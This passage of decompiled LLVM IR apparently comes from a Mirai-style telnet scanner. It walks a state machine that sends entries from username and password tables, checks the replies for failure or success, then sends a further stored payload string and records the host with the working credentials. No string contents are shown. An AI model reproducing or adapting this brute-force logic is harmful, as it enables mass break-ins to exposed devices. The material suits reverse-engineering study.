  %v2_bb30 = call i32 @__libc_fcntl(i32 %v2_bb20, i32 3)
  %v1_bb38 = and i32 %v2_bb30, -2049
  store i32 %v1_bb38, i32* @r3, align 4
  %v0_bb3c = load i32, i32* @r4, align 4
  store i32 %v1_bb38, i32* %r2.global-to-local, align 4
  %v2_bb48 = call i32 @__libc_fcntl(i32 %v0_bb3c, i32 4)
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v3_bb6c = call i32 @advance_state(i32* nonnull %v1_b998, i32 2)
  br label %dec_label_pc_c5b8

dec_label_pc_bb74:                                ; preds = %dec_label_pc_b980
  %v3_bb78 = icmp eq i32 %v5_ba58, -1
  br i1 %v3_bb78, label %dec_label_pc_bb80, label %dec_label_pc_bba4

dec_label_pc_bb80:                                ; preds = %dec_label_pc_bb74
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v3_bb9c = call i32 @reset_telstate(i32 %v2_b480, i32 %v3_b35c, i32 %v3_b474)
  br label %dec_label_pc_c5b8

dec_label_pc_bba4:                                ; preds = %dec_label_pc_bb74
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_bbc0 = add i32 %v2_b47c, %v2_bbbc
  %v1_bbc4 = inttoptr i32 %v2_bbc0 to i32*
  %v2_bbc4 = load i32, i32* %v1_bbc4, align 4
  %v1_bbc8 = add i32 %v2_bbc4, 5
  store i32 %v1_bbc8, i32* @r4, align 4
  %v2_bbd0 = call i32 @__GI_time(i32* null)
  %v0_bbd8 = load i32, i32* @r4, align 4
  %v3_bbd8 = icmp ult i32 %v0_bbd8, %v2_bbd0
  br i1 %v3_bbd8, label %dec_label_pc_bbe0, label %dec_label_pc_c5b8

dec_label_pc_bbe0:                                ; preds = %dec_label_pc_bba4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v3_bbfc = call i32 @reset_telstate(i32 %v2_b480, i32 %v3_b35c, i32 %v3_b474)
  br label %dec_label_pc_c5b8

dec_label_pc_bc04:                                ; preds = %dec_label_pc_b4cc
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v1_bc1c = inttoptr i32 %v2_b480 to i32*
  %v2_bc1c = load i32, i32* %v1_bc1c, align 4
  store i32 %v2_bc1c, i32* %ip.global-to-local, align 4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_bc3c = add i32 %v2_b47c, %v2_bc38
  %v1_bc40 = inttoptr i32 %v2_bc3c to i32*
  %v2_bc40 = load i32, i32* %v1_bc40, align 4
  store i32 %v2_bc40, i32* %r2.global-to-local, align 4
  %v1_bc48 = load i32, i32* @sp, align 4
  %v2_bc48 = inttoptr i32 %v1_bc48 to i32*
  store i32 ptrtoint (i32* @global_var_261a0 to i32), i32* %v2_bc48, align 4
  %v0_bc4c = load i32, i32* %ip.global-to-local, align 4
  %v4_bc58 = inttoptr i32 %v2_bc40 to i8*
  %v5_bc58 = call i32 @read_until_response(i32 %v0_bc4c, i32 %arg1, i8* %v4_bc58, i32 1024)
  %v2_bc60 = icmp eq i32 %v5_bc58, 0
  br i1 %v2_bc60, label %dec_label_pc_bcf0, label %dec_label_pc_bc68

dec_label_pc_bc68:                                ; preds = %dec_label_pc_bc04
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_bc84 = add i32 %v2_b480, 24
  %v1_bc88 = inttoptr i32 %v2_bc84 to i32*
  %v2_bc88 = load i32, i32* %v1_bc88, align 4
  %v1_bc90 = call i32 @contains_fail(i32 %v2_bc88)
  %v2_bc98 = icmp eq i32 %v1_bc90, 0
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  br i1 %v2_bc98, label %dec_label_pc_bcc8, label %dec_label_pc_bca0

dec_label_pc_bca0:                                ; preds = %dec_label_pc_bc68
  %v3_bcc0 = call i32 @advance_state(i32* %v1_bc1c, i32 0)
  br label %dec_label_pc_c5b8

dec_label_pc_bcc8:                                ; preds = %dec_label_pc_bc68
  %v3_bce8 = call i32 @advance_state(i32* %v1_bc1c, i32 3)
  br label %dec_label_pc_c5b8

dec_label_pc_bcf0:                                ; preds = %dec_label_pc_bc04
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_bd10 = load i32, i32* %v1_b488, align 4
  %v1_bd14 = add i32 %v2_bd10, 7
  store i32 %v1_bd14, i32* @r4, align 4
  %v2_bd1c = call i32 @__GI_time(i32* null)
  %v0_bd24 = load i32, i32* @r4, align 4
  %v3_bd24 = icmp ult i32 %v0_bd24, %v2_bd1c
  br i1 %v3_bd24, label %dec_label_pc_bd2c, label %dec_label_pc_c5b8

dec_label_pc_bd2c:                                ; preds = %dec_label_pc_bcf0
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v3_bd48 = call i32 @reset_telstate(i32 %v2_b480, i32 %v3_b35c, i32 %v3_b474)
  br label %dec_label_pc_c5b8

dec_label_pc_bd50:                                ; preds = %dec_label_pc_b4cc
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v1_bd68 = inttoptr i32 %v2_b480 to i32*
  %v2_bd68 = load i32, i32* %v1_bd68, align 4
  store i32 %v2_bd68, i32* @r4, align 4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v1_bd8c = add i32 %v2_b480, 10
  %v2_bd8c = inttoptr i32 %v1_bd8c to i8*
  %v3_bd8c = load i8, i8* %v2_bd8c, align 2
  %v4_bd8c = zext i8 %v3_bd8c to i32
  store i32 %v4_bd8c, i32* %r2.global-to-local, align 4
  %v4_bd98 = mul nuw nsw i32 %v4_bd8c, 4
  %v5_bd98 = add i32 %v4_bd98, ptrtoint ([18 x i8*]* @global_var_26128.105 to i32)
  %v6_bd98 = inttoptr i32 %v5_bd98 to i32*
  %v7_bd98 = load i32, i32* %v6_bd98, align 4
  store i32 %v7_bd98, i32* @r5, align 4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v3_bdbc = load i8, i8* %v2_bd8c, align 2
  %v4_bdbc = zext i8 %v3_bdbc to i32
  store i32 %v4_bdbc, i32* %r2.global-to-local, align 4
  %v4_bdc8 = mul nuw nsw i32 %v4_bdbc, 4
  %v5_bdc8 = add i32 %v4_bdc8, ptrtoint ([18 x i8*]* @global_var_26128.105 to i32)
  %v6_bdc8 = inttoptr i32 %v5_bdc8 to i32*
  %v7_bdc8 = load i32, i32* %v6_bdc8, align 4
  %v1_bdcc = inttoptr i32 %v7_bdc8 to i8*
  %v3_bdd0 = call i32 @strlen(i8* %v1_bdcc)
  %v0_bdd8 = load i32, i32* @r4, align 4
  %v0_bddc = load i32, i32* @r5, align 4
  store i32 %v3_bdd0, i32* %r2.global-to-local, align 4
  %v4_bde8 = call i32 @__libc_send(i32 %v0_bdd8, i32 %v0_bddc, i32 %v3_bdd0, i32 16384)
  %v1_bdf0 = icmp slt i32 %v4_bde8, 0
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  br i1 %v1_bdf0, label %dec_label_pc_bdf8, label %dec_label_pc_be1c

dec_label_pc_bdf8:                                ; preds = %dec_label_pc_bd50
  %v3_be14 = call i32 @reset_telstate(i32 %v2_b480, i32 %v3_b35c, i32 %v3_b474)
  br label %dec_label_pc_c5b8

dec_label_pc_be1c:                                ; preds = %dec_label_pc_bd50
  %v2_be34 = load i32, i32* %v1_bd68, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_be48 = call i32 @__libc_send(i32 %v2_be34, i32 ptrtoint ([3 x i8]* @global_var_1c018.107 to i32), i32 2, i32 16384)
  %v1_be50 = icmp slt i32 %v5_be48, 0
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  br i1 %v1_be50, label %dec_label_pc_be58, label %dec_label_pc_be7c

dec_label_pc_be58:                                ; preds = %dec_label_pc_be1c
  %v3_be74 = call i32 @reset_telstate(i32 %v2_b480, i32 %v3_b35c, i32 %v3_b474)
  br label %dec_label_pc_c5b8

dec_label_pc_be7c:                                ; preds = %dec_label_pc_be1c
  %v3_be9c = call i32 @advance_state(i32* nonnull %v1_bd68, i32 4)
  br label %dec_label_pc_c5b8

dec_label_pc_bea4:                                ; preds = %dec_label_pc_b4cc
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v1_bebc = inttoptr i32 %v2_b480 to i32*
  %v2_bebc = load i32, i32* %v1_bebc, align 4
  store i32 %v2_bebc, i32* %ip.global-to-local, align 4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_bedc = add i32 %v2_b47c, %v2_bc38
  %v1_bee0 = inttoptr i32 %v2_bedc to i32*
  %v2_bee0 = load i32, i32* %v1_bee0, align 4
  store i32 %v2_bee0, i32* %r2.global-to-local, align 4
  %v1_bee8 = load i32, i32* @sp, align 4
  %v2_bee8 = inttoptr i32 %v1_bee8 to i32*
  store i32 ptrtoint (i32* @global_var_261a0 to i32), i32* %v2_bee8, align 4
  %v0_beec = load i32, i32* %ip.global-to-local, align 4
  %v4_bef8 = inttoptr i32 %v2_bee0 to i8*
  %v5_bef8 = call i32 @read_until_response(i32 %v0_beec, i32 %arg1, i8* %v4_bef8, i32 1024)
  %v2_bf00 = icmp eq i32 %v5_bef8, 0
  br i1 %v2_bf00, label %dec_label_pc_bf90, label %dec_label_pc_bf08

dec_label_pc_bf08:                                ; preds = %dec_label_pc_bea4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_bf24 = add i32 %v2_b480, 24
  %v1_bf28 = inttoptr i32 %v2_bf24 to i32*
  %v2_bf28 = load i32, i32* %v1_bf28, align 4
  %v1_bf30 = call i32 @contains_fail(i32 %v2_bf28)
  %v2_bf38 = icmp eq i32 %v1_bf30, 0
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  br i1 %v2_bf38, label %dec_label_pc_bf68, label %dec_label_pc_bf40

dec_label_pc_bf40:                                ; preds = %dec_label_pc_bf08
  %v3_bf60 = call i32 @advance_state(i32* %v1_bebc, i32 0)
  br label %dec_label_pc_c5b8

dec_label_pc_bf68:                                ; preds = %dec_label_pc_bf08
  %v3_bf88 = call i32 @advance_state(i32* %v1_bebc, i32 5)
  br label %dec_label_pc_c5b8

dec_label_pc_bf90:                                ; preds = %dec_label_pc_bea4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_bfb0 = load i32, i32* %v1_b488, align 4
  %v1_bfb4 = add i32 %v2_bfb0, 3
  store i32 %v1_bfb4, i32* @r4, align 4
  %v2_bfbc = call i32 @__GI_time(i32* null)
  %v0_bfc4 = load i32, i32* @r4, align 4
  %v3_bfc4 = icmp ult i32 %v0_bfc4, %v2_bfbc
  br i1 %v3_bfc4, label %dec_label_pc_bfcc, label %dec_label_pc_c5b8

dec_label_pc_bfcc:                                ; preds = %dec_label_pc_bf90
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v3_bfe8 = call i32 @reset_telstate(i32 %v2_b480, i32 %v3_b35c, i32 %v3_b474)
  br label %dec_label_pc_c5b8

dec_label_pc_bff0:                                ; preds = %dec_label_pc_b4cc
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v1_c008 = inttoptr i32 %v2_b480 to i32*
  %v2_c008 = load i32, i32* %v1_c008, align 4
  store i32 %v2_c008, i32* @r4, align 4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v1_c02c = add i32 %v2_b480, 11
  %v2_c02c = inttoptr i32 %v1_c02c to i8*
  %v3_c02c = load i8, i8* %v2_c02c, align 1
  %v4_c02c = zext i8 %v3_c02c to i32
  store i32 %v4_c02c, i32* %r2.global-to-local, align 4
  %v4_c038 = mul nuw nsw i32 %v4_c02c, 4
  %v5_c038 = add i32 %v4_c038, ptrtoint ([9 x i8*]* @global_var_2614c.109 to i32)
  %v6_c038 = inttoptr i32 %v5_c038 to i32*
  %v7_c038 = load i32, i32* %v6_c038, align 4
  store i32 %v7_c038, i32* @r5, align 4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v3_c05c = load i8, i8* %v2_c02c, align 1
  %v4_c05c = zext i8 %v3_c05c to i32
  store i32 %v4_c05c, i32* %r2.global-to-local, align 4
  %v4_c068 = mul nuw nsw i32 %v4_c05c, 4
  %v5_c068 = add i32 %v4_c068, ptrtoint ([9 x i8*]* @global_var_2614c.109 to i32)
  %v6_c068 = inttoptr i32 %v5_c068 to i32*
  %v7_c068 = load i32, i32* %v6_c068, align 4
  %v1_c06c = inttoptr i32 %v7_c068 to i8*
  %v3_c070 = call i32 @strlen(i8* %v1_c06c)
  %v0_c078 = load i32, i32* @r4, align 4
  %v0_c07c = load i32, i32* @r5, align 4
  store i32 %v3_c070, i32* %r2.global-to-local, align 4
  %v4_c088 = call i32 @__libc_send(i32 %v0_c078, i32 %v0_c07c, i32 %v3_c070, i32 16384)
  %v1_c090 = icmp slt i32 %v4_c088, 0
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  br i1 %v1_c090, label %dec_label_pc_c098, label %dec_label_pc_c0bc

dec_label_pc_c098:                                ; preds = %dec_label_pc_bff0
  %v3_c0b4 = call i32 @reset_telstate(i32 %v2_b480, i32 %v3_b35c, i32 %v3_b474)
  br label %dec_label_pc_c5b8

dec_label_pc_c0bc:                                ; preds = %dec_label_pc_bff0
  %v2_c0d4 = load i32, i32* %v1_c008, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_c0e8 = call i32 @__libc_send(i32 %v2_c0d4, i32 ptrtoint ([3 x i8]* @global_var_1c018.107 to i32), i32 2, i32 16384)
  %v1_c0f0 = icmp slt i32 %v5_c0e8, 0
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  br i1 %v1_c0f0, label %dec_label_pc_c0f8, label %dec_label_pc_c11c

dec_label_pc_c0f8:                                ; preds = %dec_label_pc_c0bc
  %v3_c114 = call i32 @reset_telstate(i32 %v2_b480, i32 %v3_b35c, i32 %v3_b474)
  br label %dec_label_pc_c5b8

dec_label_pc_c11c:                                ; preds = %dec_label_pc_c0bc
  %v3_c13c = call i32 @advance_state(i32* nonnull %v1_c008, i32 6)
  br label %dec_label_pc_c5b8

dec_label_pc_c144:                                ; preds = %dec_label_pc_b4cc
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v1_c15c = inttoptr i32 %v2_b480 to i32*
  %v2_c15c = load i32, i32* %v1_c15c, align 4
  store i32 %v2_c15c, i32* %ip.global-to-local, align 4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_c17c = add i32 %v2_b47c, %v2_bc38
  %v1_c180 = inttoptr i32 %v2_c17c to i32*
  %v2_c180 = load i32, i32* %v1_c180, align 4
  store i32 %v2_c180, i32* %r2.global-to-local, align 4
  %v1_c188 = load i32, i32* @sp, align 4
  %v2_c188 = inttoptr i32 %v1_c188 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_261e4.111 to i32), i32* %v2_c188, align 4
  %v0_c18c = load i32, i32* %ip.global-to-local, align 4
  %v4_c198 = inttoptr i32 %v2_c180 to i8*
  %v5_c198 = call i32 @read_until_response(i32 %v0_c18c, i32 %arg1, i8* %v4_c198, i32 1024)
  %v2_c1a0 = icmp eq i32 %v5_c198, 0
  br i1 %v2_c1a0, label %dec_label_pc_c3bc, label %dec_label_pc_c1a8

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_c144
  store i32 %storemerge548, i32* @r4, align 4
  %v2_c1b0 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c1c4 = load i32, i32* @r4, align 4
  %v2_c1d0 = mul i32 %v0_c1c4, 28
  %v2_c1d8 = add i32 %v2_bbbc, %v2_c1d0
  %v2_c1dc = inttoptr i32 %v2_c1d8 to i32*
  store i32 %v2_c1b0, i32* %v2_c1dc, align 4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_c200 = load i32, i32* %v1_c180, align 4
  %v1_c208 = call i32 @contains_fail(i32 %v2_c200)
  %v2_c210 = icmp eq i32 %v1_c208, 0
  br i1 %v2_c210, label %dec_label_pc_c240, label %dec_label_pc_c218

dec_label_pc_c218:                                ; preds = %dec_label_pc_c1a8
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v3_c238 = call i32 @advance_state(i32* %v1_c15c, i32 0)
  br label %dec_label_pc_c5b8

dec_label_pc_c240:                                ; preds = %dec_label_pc_c1a8
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_c260 = load i32, i32* %v1_c180, align 4
  %v1_c268 = call i32 @contains_success(i32 %v2_c260)
  %v2_c270 = icmp eq i32 %v1_c268, 0
  br i1 %v2_c270, label %dec_label_pc_c398, label %dec_label_pc_c278

dec_label_pc_c278:                                ; preds = %dec_label_pc_c240
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v1_c298 = add i32 %v2_b480, 9
  %v2_c298 = inttoptr i32 %v1_c298 to i8*
  %v3_c298 = load i8, i8* %v2_c298, align 1
  %v7_c29c = icmp eq i8 %v3_c298, 2
  br i1 %v7_c29c, label %dec_label_pc_c2a4, label %dec_label_pc_c2cc

dec_label_pc_c2a4:                                ; preds = %dec_label_pc_c278
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v3_c2c4 = call i32 @advance_state(i32* %v1_c15c, i32 7)
  br label %dec_label_pc_c5b8

dec_label_pc_c2cc:                                ; preds = %dec_label_pc_c278
  %v2_c2d0 = load i32, i32* @global_var_26498.45, align 4
  store i32 %v2_c2d0, i32* @r4, align 4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v3_c2f0 = call i32 @get_telstate_host(i32 %v2_b480, i32 %v3_b35c, i32 %v3_b474)
  store i32 %v3_c2f0, i32* %ip.global-to-local, align 4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v1_c318 = add i32 %v2_b480, 10
  %v2_c318 = inttoptr i32 %v1_c318 to i8*
  %v3_c318 = load i8, i8* %v2_c318, align 2
  %v4_c318 = zext i8 %v3_c318 to i32
  store i32 %v4_c318, i32* %r2.global-to-local, align 4
  %v4_c324 = mul nuw nsw i32 %v4_c318, 4
  %v5_c324 = add i32 %v4_c324, ptrtoint ([18 x i8*]* @global_var_26128.105 to i32)
  %v6_c324 = inttoptr i32 %v5_c324 to i32*
  %v7_c324 = load i32, i32* %v6_c324, align 4
  store i32 %v7_c324, i32* @lr, align 4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v1_c348 = add i32 %v2_b480, 11
  %v2_c348 = inttoptr i32 %v1_c348 to i8*
  %v3_c348 = load i8, i8* %v2_c348, align 1
  %v4_c348 = zext i8 %v3_c348 to i32
  store i32 %v4_c348, i32* %r2.global-to-local, align 4
  %v4_c354 = mul nuw nsw i32 %v4_c348, 4
  %v5_c354 = add i32 %v4_c354, ptrtoint ([9 x i8*]* @global_var_2614c.109 to i32)
  %v6_c354 = inttoptr i32 %v5_c354 to i32*
  %v7_c354 = load i32, i32* %v6_c354, align 4
  %v1_c358 = load i32, i32* @sp, align 4
  %v2_c358 = inttoptr i32 %v1_c358 to i32*
  store i32 %v7_c354, i32* %v2_c358, align 4
  %v0_c35c = load i32, i32* @r4, align 4
  %v0_c364 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_c364, i32* %r2.global-to-local, align 4
  %v0_c368 = load i32, i32* @lr, align 4
  %v4_c36c = call i32 @Rootsprintf(i32 %v0_c35c, i32 ptrtoint (i32* @global_var_1c01c.114 to i32), i32 %v0_c364, i32 %v0_c368)
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v3_c390 = call i32 @advance_state(i32* %v1_c15c, i32 7)
  br label %dec_label_pc_c5b8

dec_label_pc_c398:                                ; preds = %dec_label_pc_c240
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v3_c3b4 = call i32 @reset_telstate(i32 %v2_b480, i32 %v3_b35c, i32 %v3_b474)
  br label %dec_label_pc_c5b8

dec_label_pc_c3bc:                                ; preds = %dec_label_pc_c144
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_c3d8 = add i32 %v2_b47c, %v2_bbbc
  %v1_c3dc = inttoptr i32 %v2_c3d8 to i32*
  %v2_c3dc = load i32, i32* %v1_c3dc, align 4
  %v1_c3e0 = add i32 %v2_c3dc, 7
  store i32 %v1_c3e0, i32* @r4, align 4
  %v2_c3e8 = call i32 @__GI_time(i32* null)
  %v0_c3f0 = load i32, i32* @r4, align 4
  %v3_c3f0 = icmp ult i32 %v0_c3f0, %v2_c3e8
  br i1 %v3_c3f0, label %dec_label_pc_c3f8, label %dec_label_pc_c5b8

dec_label_pc_c3f8:                                ; preds = %dec_label_pc_c3bc
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v3_c414 = call i32 @reset_telstate(i32 %v2_b480, i32 %v3_b35c, i32 %v3_b474)
  br label %dec_label_pc_c5b8

dec_label_pc_c448:                                ; preds = %dec_label_pc_b4cc
  store i32 %storemerge548, i32* @r4, align 4
  %v2_c450 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c464 = load i32, i32* @r4, align 4
  %v2_c470 = mul i32 %v0_c464, 28
  %v2_c478 = add i32 %v2_bbbc, %v2_c470
  %v2_c47c = inttoptr i32 %v2_c478 to i32*
  store i32 %v2_c450, i32* %v2_c47c, align 4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v1_c498 = inttoptr i32 %v2_b480 to i32*
  %v2_c498 = load i32, i32* %v1_c498, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_c4ac = call i32 @__libc_send(i32 %v2_c498, i32 ptrtoint ([5 x i8]* @global_var_1c07c.116 to i32), i32 4, i32 16384)
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_c4c8 = load i32, i32* %v1_c498, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_c4dc = call i32 @__libc_send(i32 %v2_c4c8, i32 ptrtoint ([8 x i8]* @global_var_1c084.118 to i32), i32 7, i32 16384)
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_c4f8 = load i32, i32* %v1_c498, align 4
  store i32 %v2_c4f8, i32* @r4, align 4
  %v2_c500 = load i32, i32* bitcast ([415 x i8]** @global_var_26124.121 to i32*), align 4
  store i32 %v2_c500, i32* @r5, align 4
  %v1_c50c = inttoptr i32 %v2_c500 to i8*
  %v3_c510 = call i32 @strlen(i8* %v1_c50c)
  %v0_c518 = load i32, i32* @r4, align 4
  %v0_c51c = load i32, i32* @r5, align 4
  store i32 %v3_c510, i32* %r2.global-to-local, align 4
  %v5_c528 = call i32 @__libc_send(i32 %v0_c518, i32 %v0_c51c, i32 %v3_c510, i32 16384)
  %v1_c530 = icmp slt i32 %v5_c528, 0
  br i1 %v1_c530, label %dec_label_pc_c538, label %dec_label_pc_c55c

dec_label_pc_c538:                                ; preds = %dec_label_pc_c448
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v3_c554 = call i32 @reset_telstate(i32 %v2_b480, i32 %v3_b35c, i32 %v3_b474)
  br label %dec_label_pc_c5b8

dec_label_pc_c55c:                                ; preds = %dec_label_pc_c448
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_c578 = add i32 %v2_b47c, %v2_bbbc
  %v1_c57c = inttoptr i32 %v2_c578 to i32*
  %v2_c57c = load i32, i32* %v1_c57c, align 4
  %v1_c580 = add i32 %v2_c57c, 25
  store i32 %v1_c580, i32* @r4, align 4
  %v2_c588 = call i32 @__GI_time(i32* null)
  %v0_c590 = load i32, i32* @r4, align 4
  %v3_c590 = icmp ult i32 %v0_c590, %v2_c588
  br i1 %v3_c590, label %dec_label_pc_c598, label %dec_label_pc_c5b8

dec_label_pc_c598:                                ; preds = %dec_label_pc_c55c
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v3_c5b4 = call i32 @reset_telstate(i32 %v2_b480, i32 %v3_b35c, i32 %v3_b474)
  br label %dec_label_pc_c5b8

dec_label_pc_c5b8:                                ; preds = %dec_label_pc_bba4, %dec_label_pc_bcf0, %dec_label_pc_bf90, %dec_label_pc_c3bc, %dec_label_pc_c55c, %dec_label_pc_b4cc, %dec_label_pc_b780, %dec_label_pc_bd2c, %dec_label_pc_bcc8, %dec_label_pc_bca0, %dec_label_pc_bbe0, %dec_label_pc_bb80, %dec_label_pc_baec, %dec_label_pc_bac8, %dec_label_pc_b91c, %dec_label_pc_b8f8, %dec_label_pc_b754, %dec_label_pc_b6fc, %dec_label_pc_c538, %dec_label_pc_c3f8, %dec_label_pc_c398, %dec_label_pc_c2cc, %dec_label_pc_c2a4, %dec_label_pc_c218, %dec_label_pc_c11c, %dec_label_pc_c0f8, %dec_label_pc_c098, %dec_label_pc_bfcc, %dec_label_pc_bf68, %dec_label_pc_bf40, %dec_label_pc_be7c, %dec_label_pc_be58, %dec_label_pc_bdf8, %dec_label_pc_c598
  %v1_c5bc = add nuw nsw i32 %storemerge548, 1
  store i32 %v1_c5bc, i32* %r2.global-to-local, align 4
  %v5_c5d0 = icmp slt i32 %v1_c5bc, %arg2
  br i1 %v5_c5d0, label %dec_label_pc_b468, label %dec_label_pc_b45c

; uselistorder directives
  uselistorder i32 %v1_c5bc, { 2, 1, 0 }
  uselistorder i32 %v3_c510, { 1, 0 }
  uselistorder i32* %v1_c15c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_c070, { 1, 0 }
  uselistorder i32 %v3_bdd0, { 1, 0 }
  uselistorder i32 %storemerge610, { 1, 0 }
  uselistorder i32 %v0_b5d4, { 1, 0 }
  uselistorder i32 %v2_b568, { 1, 0 }
  uselistorder i32 %v2_b564, { 1, 0, 2 }
  uselistorder i8* %v2_b53c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_b4b0, { 1, 0 }
  uselistorder i32* %v1_b488, { 1, 0, 2 }
  uselistorder i32 %v2_b480, { 35, 34, 36, 27, 28, 29, 30, 31, 32, 33, 24, 23, 25, 26, 21, 4, 22, 18, 17, 19, 20, 15, 3, 16, 13, 12, 11, 14, 6, 7, 1, 2, 8, 0, 10, 9, 5 }
  uselistorder i32 %v2_b47c, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v3_b474, { 81, 82, 80, 78, 79, 77, 76, 75, 61, 62, 60, 65, 66, 73, 72, 71, 69, 70, 68, 67, 64, 74, 63, 59, 58, 56, 57, 54, 55, 53, 52, 51, 47, 48, 46, 50, 49, 45, 44, 42, 43, 40, 41, 39, 38, 37, 33, 34, 32, 36, 35, 31, 30, 28, 29, 27, 25, 26, 23, 22, 24, 21, 20, 19, 18, 17, 11, 9, 10, 8, 7, 6, 5, 4, 16, 15, 14, 13, 12, 3, 2, 1, 0 }
  uselistorder i32 %storemerge548, { 1, 4, 5, 7, 6, 3, 2, 0 }
  uselistorder i32 %v2_bbbc, { 3, 0, 4, 1, 5, 2 }
  uselistorder i32 %v2_b944, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v1_b440, { 1, 2, 0 }
  uselistorder i32 %v1_b41c, { 2, 1, 0 }
  uselistorder i32 %storemerge457, { 1, 0 }
  uselistorder i32 %v3_b35c, { 4, 3, 5, 6, 7, 9, 8, 10, 12, 11, 13, 16, 15, 14, 18, 0, 19, 17, 1, 22, 23, 24, 21, 2, 20 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-612, { 0, 2, 1 }
  uselistorder i32* %stack_var_-340, { 1, 0, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 55, 0, 59, 60, 61, 62, 63, 64, 66, 65, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 110, 56, 57, 109, 58 }
  uselistorder i32* %ip.global-to-local, { 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 ptrtoint ([9 x i8*]* @global_var_2614c.109 to i32), { 2, 0, 1 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_1c018.107 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([18 x i8*]* @global_var_26128.105 to i32), { 2, 0, 1 }
  uselistorder i32 (i32)* @contains_fail, { 2, 1, 3, 0 }
  uselistorder i32 (i32, i32, i8*, i32)* @read_until_response, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32*, i32)* @advance_state, { 4, 5, 6, 7, 8, 9, 10, 0, 1, 2, 3, 11 }
  uselistorder i32 (i32, i32, i32)* @reset_telstate, { 13, 7, 6, 5, 4, 3, 2, 1, 0, 12, 11, 10, 9, 8 }
  uselistorder i32 %arg2, { 2, 3, 0, 1, 4 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c5b8, { 33, 4, 18, 19, 3, 20, 21, 22, 23, 24, 25, 26, 27, 2, 28, 29, 30, 31, 32, 7, 1, 8, 9, 10, 0, 11, 12, 13, 14, 15, 6, 16, 17, 5 }
  uselistorder label %dec_label_pc_b958, { 1, 0 }
  uselistorder label %dec_label_pc_b91c, { 1, 0 }
